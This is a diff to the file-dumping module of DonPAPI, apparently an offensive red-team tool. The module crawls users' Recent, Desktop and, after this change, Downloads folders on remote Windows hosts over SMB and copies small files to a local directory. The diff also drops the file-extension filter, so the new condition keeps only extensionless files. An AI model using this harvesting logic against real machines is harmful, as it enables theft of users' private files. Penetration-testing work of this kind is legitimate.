@@ -7,13 +7,15 @@ from dploot.lib.smb import DPLootSMBConnection
 from donpapi.core import DonPAPICore
 from donpapi.lib.logger import DonPAPIAdapter
 
-
 TAG = "Files"
 
 class FilesDump:
     false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
-    user_directories = ["Users\\{username}\\Recent", "Users\\{username}\\Desktop"]
-    mask = ['xls','pdf','doc','txt','lnk','kbdx','xml','config','conf','bat','sh']
+    user_directories = [
+        "Users\\{username}\\Recent", 
+        "Users\\{username}\\Desktop",
+        "Users\\{username}\\Downloads"
+    ]
     max_filesize = 5000000
 
     def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
@@ -41,8 +43,7 @@ class FilesDump:
                             if recurse_level < recurse_max:
                                 self.dig_files(directory_path=new_path, recurse_level=recurse_level+1, recurse_max=recurse_max)
                         else:
-                            # It's a file, download it to the output share if the mask is ok
-                            if (item.get_longname().find(".") == -1 or item.get_longname().split(".")[-1] in self.mask) and item.get_filesize() < self.max_filesize: 
+                            if item.get_longname().find(".") == -1 and item.get_filesize() < self.max_filesize: 
                                 file_content = self.conn.readFile(self.context.share, new_path)
                                 local_filepath = os.path.join(self.context.output_dir, *(new_path.split('\\')))
                                 os.makedirs(os.path.dirname(local_filepath), exist_ok=True)
